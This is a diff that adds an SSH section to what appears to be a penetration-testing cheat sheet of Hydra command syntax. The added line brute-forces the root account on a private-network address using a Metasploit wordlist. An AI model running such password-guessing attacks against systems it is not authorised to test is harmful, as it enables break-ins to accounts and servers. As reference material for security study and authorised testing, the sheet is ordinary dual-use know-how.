@@ -13,3 +13,8 @@ Below are commonly used syntax for below protocols.
 hydra -l <username> -P <password_list> <target> http-post-form "<login_url>:<post_data>:<failure_string>"
 ```
 
+## SSH
+
+```
+ hydra -l root -P /usr/share/wordlists/metasploit/unix_users.txt ssh://192.168.0.103:22 -t 10 -V
+```
